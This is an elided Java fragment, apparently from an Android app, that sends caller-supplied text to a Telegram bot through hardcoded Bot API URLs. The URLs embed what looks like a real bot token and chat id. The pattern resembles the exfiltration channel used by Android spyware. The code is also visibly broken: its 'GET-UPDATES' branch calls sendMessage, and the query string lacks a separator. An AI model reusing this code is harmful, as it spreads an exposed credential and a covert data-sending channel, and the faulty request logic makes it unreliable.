    ...
    protected String doInBackground(String... info) {
        ...
        try
        {
            ...
            if( info[0].contains("GET-SEND")){
                ...
                URL url = new URL("https://api.telegram.org/bot6953803560:AAHBI_I4fH_O1dyvA8_UZFdNRLVa1pYUuCo/sendMessage?chat_id=6953803560&text=" + info[1]);
            ...
            if( info[0].contains("GET-UPDATES")){
                URL url = new URL("https://api.telegram.org/bot6953803560:AAHBI_I4fH_O1dyvA8_UZFdNRLVa1pYUuCo/sendMessage?chat_id=6953803560&text=" + offset + "timeout=5");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("GET");
                conn.setRequestProperty("Content-length", "0");
